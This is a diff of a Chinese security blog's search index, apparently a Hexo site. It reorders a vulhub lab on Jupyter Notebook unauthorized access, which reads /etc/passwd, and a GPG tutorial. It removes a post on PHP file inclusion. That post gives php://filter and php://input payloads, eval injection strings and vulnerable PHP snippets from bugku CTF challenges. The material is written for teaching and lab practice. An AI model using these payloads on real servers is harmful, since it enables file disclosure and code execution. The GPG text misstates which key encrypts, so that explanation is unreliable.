@@ -73,6 +73,34 @@
       </tags>
   </entry>
   <entry>
+    <title>Jupyter Notebook 未授权访问漏洞</title>
+    <url>/2023/11/22/Jupyter-Notebook-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h1 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h1><p>漏洞环境：Jupyter Notebook 未授权访问漏洞</p>
+<ol>
+<li>复现环境中的未授权访问漏洞，登录Jupyter Web管理界面，截图证明</li>
+<li>利用Jupyter Notebook控制台执行系统命令，读取&#x2F;etc&#x2F;passwd内容，提供截图</li>
+</ol>
+<h1 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h1><p>运行测试环境：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure>
+
+<p>运行后，访问<code>http://your-ip:8888</code>将看到Jupyter Notebook的Web管理界面，并没有要求填写密码。</p>
+<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>选择 new -&gt; terminal 即可创建一个控制台：</p>
+<img data-src="https://images.gaifagafin.top/202311222307962.png" style="zoom:67%;" />
+
+<p>可以直接执行任意命令：</p>
+<img data-src="https://images.gaifagafin.top/202311222307718.png" style="zoom:80%;" />
+
+<h1 id="读取-etc-passwd内容"><a href="#读取-etc-passwd内容" class="headerlink" title="读取&#x2F;etc&#x2F;passwd内容"></a>读取&#x2F;etc&#x2F;passwd内容</h1><img data-src="https://images.gaifagafin.top/202311222307464.png" style="zoom:80%;" />
+]]></content>
+      <categories>
+        <category>vulhub</category>
+      </categories>
+      <tags>
+        <tag>vulhub</tag>
+        <tag>漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Apache solr XXE漏洞(CVE-2017-12629)</title>
     <url>/2023/11/22/Apache-solr-XXE%E6%BC%8F%E6%B4%9E(CVE-2017-12629)/</url>
     <content><![CDATA[<h1 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h1><p>漏洞环境：Apache solr XXE漏洞(CVE-2017-12629)</p>
@@ -154,6 +182,93 @@
       <tags>
         <tag>vulhub</tag>
         <tag>漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Linux_GPG加解密文件</title>
+    <url>/2023/11/10/Linux%E4%BD%BF%E7%94%A8GPG%E5%8A%A0%E5%AF%86%E6%96%87%E4%BB%B6/</url>
+    <content><![CDATA[<h2 id="下载GPG"><a href="#下载GPG" class="headerlink" title="下载GPG"></a>下载GPG</h2><p>GPG官方下载地址: <a href="https://gnupg.org/download/index.html">https://gnupg.org/download/index.html</a></p>
+<p>我所使用的是kali_Linux，选择的是</p>
+<img data-src="https://images.gaifagafin.top/202311101728889.png" style="zoom: 67%;" />
+
+<p>请自行选择适合的版本下载，解压即可使用</p>
+<p>也可以输入命令安装</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install gnupg</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>要使用 GPG，你首先需要有一个 GPG 密钥。</p>
+<p>GPG 密钥是你在后面的教程中用来加密（或解密）文件的东西。它也是用来识别你的身份的，你的名字和电子邮件也会与密钥绑定。</p>
+<p>GPG 密钥的工作原理是使用两个文件，一个私钥和一个公钥。这两个密钥是相互联系的，并且 GPG 的所有功能都需要使用它们，特别是对文件加密和解密。</p>
+<p>当你用 GPG 加密一个文件时，它使用的是私钥。然后，这个新的加密文件<strong>只能</strong>用配对的公钥进行解密。</p>
+<p>私钥，顾名思义，是以私下的、不给任何人看的方式来存储的密钥。</p>
+<p>另一方面，公钥是用来给其他人的，或者你希望能够解密你的文件的任何人。</p>
+<p>这就是 GPG 的加密方法的主要作用。它允许你对文件进行本地加密，然后允许其他人确保他们收到的文件实际上是由你发送的。因为他们能够解密文件的唯一方法是使用你的公钥，而这只有在文件首先使用你的私钥加密的情况下才有效。</p>
+<p><strong>反之</strong>，其他人可以用你的公钥对文件进行加密，而唯一能够解密的方法是用你的私钥。因此，允许其他人公开发布文件，而不用担心除了你以外的人能够阅读它们。（LCTT 译注：另外一个常见的用例是你用你的私钥对公开发布的文件进行签名，别人使用你的公钥通过验证你的签名而确信文件是你发布的、并没有被篡改。但本文没有涉及这个用例。）</p>
+<p>换句话说，如果一个文件是用私钥加密的，它只能用相应的公钥解密。而如果一个文件是用公钥加密的，它只能用相应的私钥解密。</p>
+<h2 id="生成GPG密钥"><a href="#生成GPG密钥" class="headerlink" title="生成GPG密钥"></a>生成GPG密钥</h2><p>运行下面指令</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gpg --full-generate-key</span><br></pre></td></tr></table></figure>
+
+<p>根据你的选择填写密钥类型，密钥长度，有效期限，姓名和邮箱</p>
+<img data-src="https://images.gaifagafin.top/202311101728808.png" style="zoom: 67%;" />
+
+<p>输入O确定时，会让你输入密码，这个是可选项</p>
+<img data-src="https://images.gaifagafin.top/202311101728440.png" style="zoom: 67%;" />
+
+<p>如果不想填就直接点确定，选择”是的，保护不是必须的”</p>
+<img data-src="https://images.gaifagafin.top/202311101728040.png" style="zoom: 67%;" />
+
+<p>然后就会生成密钥对</p>
+<img data-src="https://images.gaifagafin.top/202311101728869.png" style="zoom:67%;" />
+
+<p>这里我们看不到私钥，可以终端输入下面指令查看</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gpg --list-secret-keys</span><br></pre></td></tr></table></figure>
+
+<img data-src="https://images.gaifagafin.top/202311101728476.png" style="zoom: 67%;" />
+
+<h2 id="GPG加密文件"><a href="#GPG加密文件" class="headerlink" title="GPG加密文件"></a>GPG加密文件</h2><p>首先创建要加密的文件(类型不限)test.txt</p>
+<p>要发送加密文件给别人，<strong>你需要有接收者的公钥</strong>，用接收者的公钥加密文件，这样<strong>只有接收者才能解密文件</strong>。具体怎么获得密钥由你自己决定。 你可以让他们直接把公钥发送给你， 也可以通过密钥服务器来获取。</p>
+<p>收到对方公钥文件后，导入公钥到 GPG 中。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gpg --import receiver.key</span><br></pre></td></tr></table></figure>
+
+<img data-src="https://images.gaifagafin.top/202311101728778.png" style="zoom: 67%;" />
+
+<p>这些公钥与你自己创建的密钥一样，自带了名称和电子邮件地址的信息。 </p>
+<p>现在可以开始加密要发送的文件了。GPG 需要知道这个文件的接收者和发送者。输入下面指令, 这里<code>-e</code>标志告诉 GPG 你想要加密文件，<code>-r</code>标志指定接收者。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gpg -e -r &quot;Receiver Name&quot; test.txt</span><br></pre></td></tr></table></figure>
+
+<img data-src="https://images.gaifagafin.top/202311101728527.png" style="zoom: 67%;" />
+
+<p>得到<code>.gpg</code>后缀的加密文件</p>
+<img data-src="https://images.gaifagafin.top/202311101728516.png" style="zoom: 67%;" />
+
+<p>如果你有多个密钥，可以用下面指令加密，<code>-u</code>参数指定发送者</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gpg -e -u &quot;Your Name&quot; -r &quot;Receiver Name&quot; &lt;filename&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="GPG解密文件"><a href="#GPG解密文件" class="headerlink" title="GPG解密文件"></a>GPG解密文件</h2><p>收到对方用我们自己的公钥加密的.gpg文件后，使用下面命令解密</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gpg -d &lt;filename&gt;</span><br></pre></td></tr></table></figure>
+
+<p>例如我要解密用我的公钥加密的.gpg文件 1.txt.gpg 直接终端输入<code>gpg -d 1.txt.gpg </code></p>
+<img data-src="https://images.gaifagafin.top/202311101728700.png" style="zoom: 67%;" />
+
+<h2 id="删除密钥"><a href="#删除密钥" class="headerlink" title="删除密钥"></a>删除密钥</h2><p>删除密钥有三个选项：</p>
+<p>–delete-keys、–delete-secret-keys和–delete-secret-and-public-key<br>–delete-keys表示从公钥钥匙圈上删除密钥，也就是一同删除公钥和对应的私钥。在分批模式（batch mode）下，密钥必须使用指纹表示，或者使用–yes选项。<br>–delete-secret-keys表示从私钥钥匙圈上删除密钥。<br>–delete-secret-and-public-key和–delete-keys一样，但是如果私钥存在的话，会先移除私钥。在分批模式下，密钥必须使用指纹表示。</p>
+<p>例如我要删除我的公钥中的<code>testname</code>公钥，就输入下面的语句</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gpg --delete-keys testname</span><br></pre></td></tr></table></figure>
+
+<p>要删除<code>testname</code>私钥，就输入下面语句</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gpg --delete-secret-keys testname</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>参考链接:</p>
+<p><a href="https://www.linuxprobe.com/gpg-encrypt-decrypt.html">https://www.linuxprobe.com/gpg-encrypt-decrypt.html</a></p>
+<p><a href="https://blog.csdn.net/qq_33919450/article/details/115706604">https://blog.csdn.net/qq_33919450/article/details/115706604</a></p>
+]]></content>
+      <categories>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>GPG</tag>
+        <tag>Linux</tag>
       </tags>
   </entry>
   <entry>
@@ -557,34 +672,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Jupyter Notebook 未授权访问漏洞</title>
-    <url>/2023/11/22/Jupyter-Notebook-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<h1 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h1><p>漏洞环境：Jupyter Notebook 未授权访问漏洞</p>
-<ol>
-<li>复现环境中的未授权访问漏洞，登录Jupyter Web管理界面，截图证明</li>
-<li>利用Jupyter Notebook控制台执行系统命令，读取&#x2F;etc&#x2F;passwd内容，提供截图</li>
-</ol>
-<h1 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h1><p>运行测试环境：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure>
-
-<p>运行后，访问<code>http://your-ip:8888</code>将看到Jupyter Notebook的Web管理界面，并没有要求填写密码。</p>
-<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>选择 new -&gt; terminal 即可创建一个控制台：</p>
-<img data-src="https://images.gaifagafin.top/202311222307962.png" style="zoom:67%;" />
-
-<p>可以直接执行任意命令：</p>
-<img data-src="https://images.gaifagafin.top/202311222307718.png" style="zoom:80%;" />
-
-<h1 id="读取-etc-passwd内容"><a href="#读取-etc-passwd内容" class="headerlink" title="读取&#x2F;etc&#x2F;passwd内容"></a>读取&#x2F;etc&#x2F;passwd内容</h1><img data-src="https://images.gaifagafin.top/202311222307464.png" style="zoom:80%;" />
-]]></content>
-      <categories>
-        <category>vulhub</category>
-      </categories>
-      <tags>
-        <tag>vulhub</tag>
-        <tag>漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>OpenTSDB 命令注入漏洞（CVE-2020-35476）</title>
     <url>/2023/11/11/OpenTSDB-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-35476%EF%BC%89/</url>
     <content><![CDATA[<h2 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h2><p><strong>漏洞环境：OpenTSDB 命令注入漏洞（CVE-2020-35476）</strong></p>
@@ -671,557 +758,6 @@
       <tags>
         <tag>vulhub</tag>
         <tag>漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Linux_GPG加解密文件</title>
-    <url>/2023/11/10/Linux%E4%BD%BF%E7%94%A8GPG%E5%8A%A0%E5%AF%86%E6%96%87%E4%BB%B6/</url>
-    <content><![CDATA[<h2 id="下载GPG"><a href="#下载GPG" class="headerlink" title="下载GPG"></a>下载GPG</h2><p>GPG官方下载地址: <a href="https://gnupg.org/download/index.html">https://gnupg.org/download/index.html</a></p>
-<p>我所使用的是kali_Linux，选择的是</p>
-<img data-src="https://images.gaifagafin.top/202311101728889.png" style="zoom: 67%;" />
-
-<p>请自行选择适合的版本下载，解压即可使用</p>
-<p>也可以输入命令安装</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install gnupg</span><br></pre></td></tr></table></figure>
-
-<hr>
-<p>要使用 GPG，你首先需要有一个 GPG 密钥。</p>
-<p>GPG 密钥是你在后面的教程中用来加密（或解密）文件的东西。它也是用来识别你的身份的，你的名字和电子邮件也会与密钥绑定。</p>
-<p>GPG 密钥的工作原理是使用两个文件，一个私钥和一个公钥。这两个密钥是相互联系的，并且 GPG 的所有功能都需要使用它们，特别是对文件加密和解密。</p>
-<p>当你用 GPG 加密一个文件时，它使用的是私钥。然后，这个新的加密文件<strong>只能</strong>用配对的公钥进行解密。</p>
-<p>私钥，顾名思义，是以私下的、不给任何人看的方式来存储的密钥。</p>
-<p>另一方面，公钥是用来给其他人的，或者你希望能够解密你的文件的任何人。</p>
-<p>这就是 GPG 的加密方法的主要作用。它允许你对文件进行本地加密，然后允许其他人确保他们收到的文件实际上是由你发送的。因为他们能够解密文件的唯一方法是使用你的公钥，而这只有在文件首先使用你的私钥加密的情况下才有效。</p>
-<p><strong>反之</strong>，其他人可以用你的公钥对文件进行加密，而唯一能够解密的方法是用你的私钥。因此，允许其他人公开发布文件，而不用担心除了你以外的人能够阅读它们。（LCTT 译注：另外一个常见的用例是你用你的私钥对公开发布的文件进行签名，别人使用你的公钥通过验证你的签名而确信文件是你发布的、并没有被篡改。但本文没有涉及这个用例。）</p>
-<p>换句话说，如果一个文件是用私钥加密的，它只能用相应的公钥解密。而如果一个文件是用公钥加密的，它只能用相应的私钥解密。</p>
-<h2 id="生成GPG密钥"><a href="#生成GPG密钥" class="headerlink" title="生成GPG密钥"></a>生成GPG密钥</h2><p>运行下面指令</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gpg --full-generate-key</span><br></pre></td></tr></table></figure>
-
-<p>根据你的选择填写密钥类型，密钥长度，有效期限，姓名和邮箱</p>
-<img data-src="https://images.gaifagafin.top/202311101728808.png" style="zoom: 67%;" />
-
-<p>输入O确定时，会让你输入密码，这个是可选项</p>
-<img data-src="https://images.gaifagafin.top/202311101728440.png" style="zoom: 67%;" />
-
-<p>如果不想填就直接点确定，选择”是的，保护不是必须的”</p>
-<img data-src="https://images.gaifagafin.top/202311101728040.png" style="zoom: 67%;" />
-
-<p>然后就会生成密钥对</p>
-<img data-src="https://images.gaifagafin.top/202311101728869.png" style="zoom:67%;" />
-
-<p>这里我们看不到私钥，可以终端输入下面指令查看</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gpg --list-secret-keys</span><br></pre></td></tr></table></figure>
-
-<img data-src="https://images.gaifagafin.top/202311101728476.png" style="zoom: 67%;" />
-
-<h2 id="GPG加密文件"><a href="#GPG加密文件" class="headerlink" title="GPG加密文件"></a>GPG加密文件</h2><p>首先创建要加密的文件(类型不限)test.txt</p>
-<p>要发送加密文件给别人，<strong>你需要有接收者的公钥</strong>，用接收者的公钥加密文件，这样<strong>只有接收者才能解密文件</strong>。具体怎么获得密钥由你自己决定。 你可以让他们直接把公钥发送给你， 也可以通过密钥服务器来获取。</p>
-<p>收到对方公钥文件后，导入公钥到 GPG 中。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gpg --import receiver.key</span><br></pre></td></tr></table></figure>
-
-<img data-src="https://images.gaifagafin.top/202311101728778.png" style="zoom: 67%;" />
-
-<p>这些公钥与你自己创建的密钥一样，自带了名称和电子邮件地址的信息。 </p>
-<p>现在可以开始加密要发送的文件了。GPG 需要知道这个文件的接收者和发送者。输入下面指令, 这里<code>-e</code>标志告诉 GPG 你想要加密文件，<code>-r</code>标志指定接收者。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gpg -e -r &quot;Receiver Name&quot; test.txt</span><br></pre></td></tr></table></figure>
-
-<img data-src="https://images.gaifagafin.top/202311101728527.png" style="zoom: 67%;" />
-
-<p>得到<code>.gpg</code>后缀的加密文件</p>
-<img data-src="https://images.gaifagafin.top/202311101728516.png" style="zoom: 67%;" />
-
-<p>如果你有多个密钥，可以用下面指令加密，<code>-u</code>参数指定发送者</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gpg -e -u &quot;Your Name&quot; -r &quot;Receiver Name&quot; &lt;filename&gt;</span><br></pre></td></tr></table></figure>
-
-<h2 id="GPG解密文件"><a href="#GPG解密文件" class="headerlink" title="GPG解密文件"></a>GPG解密文件</h2><p>收到对方用我们自己的公钥加密的.gpg文件后，使用下面命令解密</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gpg -d &lt;filename&gt;</span><br></pre></td></tr></table></figure>
-
-<p>例如我要解密用我的公钥加密的.gpg文件 1.txt.gpg 直接终端输入<code>gpg -d 1.txt.gpg </code></p>
-<img data-src="https://images.gaifagafin.top/202311101728700.png" style="zoom: 67%;" />
-
-<h2 id="删除密钥"><a href="#删除密钥" class="headerlink" title="删除密钥"></a>删除密钥</h2><p>删除密钥有三个选项：</p>
-<p>–delete-keys、–delete-secret-keys和–delete-secret-and-public-key<br>–delete-keys表示从公钥钥匙圈上删除密钥，也就是一同删除公钥和对应的私钥。在分批模式（batch mode）下，密钥必须使用指纹表示，或者使用–yes选项。<br>–delete-secret-keys表示从私钥钥匙圈上删除密钥。<br>–delete-secret-and-public-key和–delete-keys一样，但是如果私钥存在的话，会先移除私钥。在分批模式下，密钥必须使用指纹表示。</p>
-<p>例如我要删除我的公钥中的<code>testname</code>公钥，就输入下面的语句</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gpg --delete-keys testname</span><br></pre></td></tr></table></figure>
-
-<p>要删除<code>testname</code>私钥，就输入下面语句</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gpg --delete-secret-keys testname</span><br></pre></td></tr></table></figure>
-
-<hr>
-<p>参考链接:</p>
-<p><a href="https://www.linuxprobe.com/gpg-encrypt-decrypt.html">https://www.linuxprobe.com/gpg-encrypt-decrypt.html</a></p>
-<p><a href="https://blog.csdn.net/qq_33919450/article/details/115706604">https://blog.csdn.net/qq_33919450/article/details/115706604</a></p>
-]]></content>
-      <categories>
-        <category>Linux</category>
-      </categories>
-      <tags>
-        <tag>GPG</tag>
-        <tag>Linux</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>PHP伪协议</title>
-    <url>/2023/10/31/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
-    <content><![CDATA[<h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><p>为了更好地使用代码的重用性，可以使用文件包含函数将文件包含进来，直接使用文件中的代码来提高重用性。但是这也产生了<strong>文件包含漏洞</strong>，产生原因是在通过 PHP 的函数引入文件时，为了灵活包含文件会将被包含文件设置为变量，通过动态变量来引入需要包含的文件。此时用户可以对变量的值可控，而服务器端未对变量值进行合理地校验或者校验被绕过，就会导致文件包含漏洞。</p>
-<h2 id="文件包含函数"><a href="#文件包含函数" class="headerlink" title="文件包含函数"></a>文件包含函数</h2><table>
-<thead>
-<tr>
-<th>函数</th>
-<th>功能</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>include()</td>
-<td>代码执行到 include() 函数时将文件包含</td>
-</tr>
-<tr>
-<td>include_once()</td>
-<td>当重复调用同一文件时只调用一次,功能与 include() 相同</td>
-</tr>
-<tr>
-<td>require()</td>
-<td>require() 执行如果发生错误，函数会报错并终止脚本</td>
-</tr>
-<tr>
-<td>require_once()</td>
-<td>当重复调用同一文件时只调用一次,功能与 require() 相同</td>
-</tr>
-</tbody></table>
-<h2 id="包含漏洞分类"><a href="#包含漏洞分类" class="headerlink" title="包含漏洞分类"></a>包含漏洞分类</h2><h3 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h3><p>当包含的文件在服务器本地时，就形成了本地文件包含。文件包含可以包含任意文件，被包含的文件可以不是 PHP 代码，可以是文本或图片等。只要文件被包含就会被服务器脚本语言执行，如果包含的文件内容不符合 php 语法，会直接将文件内容输出。例如下面这段简易的代码：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="远程包含"><a href="#远程包含" class="headerlink" title="远程包含"></a>远程包含</h3><p>当包含的文件在远程服务器上时，就形成了远程文件包含。所包含远程服务器的文件后缀不能与目标服务器语言相同，远程文件包含需要在 php.ini 中设置：</p>
-<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line">Copy <span class="attr">Highlighter-hljsallow_url_include</span> = <span class="literal">on</span>（是否允许 include/require 远程文件）</span><br><span class="line"><span class="attr">allow_url_fopen</span> = <span class="literal">on</span>（是否允许打开远程文件）</span><br></pre></td></tr></table></figure>
-
-<h1 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h1><h2 id="PHP-伪协议"><a href="#PHP-伪协议" class="headerlink" title="PHP 伪协议"></a>PHP 伪协议</h2><p><strong>PHP 伪协议</strong>是 PHP 支持的协议与封装协议，几个 PHP 支持的伪协议如下。</p>
-<table>
-<thead>
-<tr>
-<th>伪协议</th>
-<th>功能</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>file:&#x2F;&#x2F;</td>
-<td>访问本地文件系统</td>
-</tr>
-<tr>
-<td>http:&#x2F;&#x2F;</td>
-<td>访问 HTTP(s) 网址</td>
-</tr>
-<tr>
-<td>php:&#x2F;&#x2F;</td>
-<td>访问各个输入&#x2F;输出流</td>
-</tr>
-<tr>
-<td>phar:&#x2F;&#x2F;</td>
-<td>PHP 归档</td>
-</tr>
-<tr>
-<td>zip:&#x2F;&#x2F;</td>
-<td>压缩流</td>
-</tr>
-</tbody></table>
-<p>例如在 allow_url_include &#x3D; on 时服务器上有个文件叫 index.php，且存在文件包含漏洞，这个时候就能用 php 伪协议直接把文件显示出来。</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">?file=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure>
-
-<p>稍微解释下这个做法，<strong>php:&#x2F;&#x2F;filter&#x2F;</strong> 是一种访问本地文件的协议，&#x2F;read&#x3D;convert.base64-encode&#x2F; 表示读取的方式是 base64 编码后，resource&#x3D;index.php 表示目标文件为index.php。问什么要进行 base64 编码呢？如果不进行 base64 编码传入，index.php 就会直接执行，我们就看不到文件中的内容了。<br>php 协议还常用 <strong>php:&#x2F;&#x2F;input</strong>，这可以访问请求的原始数据的只读流，可以读取 POST 请求的参数。</p>
-<h2 id="使用样例"><a href="#使用样例" class="headerlink" title="使用样例"></a>使用样例</h2><p>假设一个测试页面该页面存在文件包含漏洞，且网站内部有密码的备份文件，尝试获取密码。在 index.php 页面下有个 file 参数用于接收要包含的文件，设置之为 php:&#x2F;&#x2F;input 伪协议，用 post 传递要执行的 php 代码。系统执行 ls 命令遍历目录，看到当前目录下有 2 个 php 文件。<br><img data-src="https://images.gaifagafin.top/202311051147768.png"><br>显然密码文件不在这里，执行 pwd 命令查看当前的目录，看到这里距离站点根目录还有好几层。<br><img data-src="https://images.gaifagafin.top/202311051147341.png"><br>使用“ls ..”遍历上一级目录，看到一张图片和 2 个网站的目录。<br><img data-src="https://images.gaifagafin.top/202311051147439.png"><br>使用“ls ..&#x2F;..”遍历上一级的上一级目录，看到文件“mima”，此地无银三百两。<br><img data-src="https://images.gaifagafin.top/202311051147878.png"><br>使用 php:&#x2F;&#x2F;filter 伪协议查看该文件，base64 解码后得到想要的东西。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=php:<span class="comment">//filter/read=convert.base64-encode/resource=../../mima</span></span><br></pre></td></tr></table></figure>
-
-<p><img data-src="https://images.gaifagafin.top/202311051148657.png"><br><img data-src="https://images.gaifagafin.top/202311051148548.png"></p>
-<h2 id="data-伪协议"><a href="#data-伪协议" class="headerlink" title="data 伪协议"></a>data 伪协议</h2><p>php 5.2.0 起，数据流封装器开始有效，主要用于数据流的读取，如果传入的数据是PHP代码就会执行代码。使用方法为:</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">data:<span class="comment">//text/plain;base64,xxxx(base64编码后的数据)</span></span><br></pre></td></tr></table></figure>
-
-<h1 id="例题：bugku-本地包含"><a href="#例题：bugku-本地包含" class="headerlink" title="例题：bugku-本地包含"></a>例题：bugku-本地包含</h1><p>题目的源码如下，观察到代码将提取一个 REQUEST 变量，这个变量时 HTTP Request 变量，默认情况下包含了 GET、POST 和 COOKIE 的数组。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="variable">$a</span> = @<span class="variable">$_REQUEST</span>[<span class="string">&#x27;hello&#x27;</span>];</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;var_dump(<span class="subst">$a</span>);&quot;</span>);      <span class="comment">//var_dump() 函数可以输出变量的类型和值</span></span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>第一种解法是利用 eval() 函数，它把字符串按照 PHP 代码来计算，该字符串必须是合法的 PHP 代码且必须以分号结尾。这里 eval() 会把变量 a 中的内容提取出来，然后执行 var_dump() 函数输出。不过由于变量 a 来自于变量 hello 变量，而如果 hello 变量中的内容是代码，也会被执行。所以这里可以传入一句代码来直接显示 flag.php，例如：</p>
-<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">hello</span><span class="operator">=</span>)<span class="comment">;show_source(%27flag.php%27</span></span><br></pre></td></tr></table></figure>
-
-<p>则在 eval 中，就会把上述 hello 的值替换掉变量 a，等同于执行如下代码：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>();</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br></pre></td></tr></table></figure>
-
-<p>同理，使用其他的函数显示文件也是可以的，注意使用 “);” 来构造。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">hello=);<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">file</span>(<span class="string">&quot;flag.php&quot;</span>)</span><br><span class="line">hello=);<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file</span>(<span class="string">&quot;flag.php&quot;</span>)</span><br><span class="line">hello=);<span class="keyword">include</span>(@<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]</span><br></pre></td></tr></table></figure>
-
-<p>第二种解法就是用 PHP 伪协议把 flag.php 文件读出来，然后再使用 include() 函数包含出来。<br><img data-src="https://images.gaifagafin.top/202311051151314.png"><br>当然还有第 3 种解法，就是直接把 flag.php 导入到 hello 变量中。</p>
-<h1 id="例题：bugku-flag-在-index-里"><a href="#例题：bugku-flag-在-index-里" class="headerlink" title="例题：bugku-flag 在 index 里"></a>例题：bugku-flag 在 index 里</h1><p>打开网页，点击后观察 url 有个文件包含漏洞，也就是说我们可以想办法把包含 flag 的文件导出来。<br><img data-src="https://images.gaifagafin.top/202311051149193.png"><br>根据提示 flag 在 index.php 里，使用 php 伪协议把文件内容的 base64 编码导出，解码得到 flag。<br><img data-src="https://images.gaifagafin.top/202311051149193.png"></p>
-<h1 id="例题：bugku-welcome-to-bugkuctf"><a href="#例题：bugku-welcome-to-bugkuctf" class="headerlink" title="例题：bugku-welcome to bugkuctf"></a>例题：bugku-welcome to bugkuctf</h1><p>打开网页查看源码如下，源码要求用 GET 方式传递三个参数，其中 user 不为空，并且作为文件名变量打开后的文件内容为 “welcome to the bugkuctf”，file 要求值为 hint.php。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!--  </span><br><span class="line"><span class="variable">$user</span> = <span class="variable">$_GET</span>[<span class="string">&quot;txt&quot;</span>];  </span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];  </span><br><span class="line"><span class="variable">$pass</span> = <span class="variable">$_GET</span>[<span class="string">&quot;password&quot;</span>];  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$user</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$user</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the bugkuctf&quot;</span>))&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hello admin!&lt;br&gt;&quot;</span>;  </span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>); <span class="comment">//hint.php  </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;you are not admin ! &quot;</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"> --&gt;  </span><br></pre></td></tr></table></figure>
-
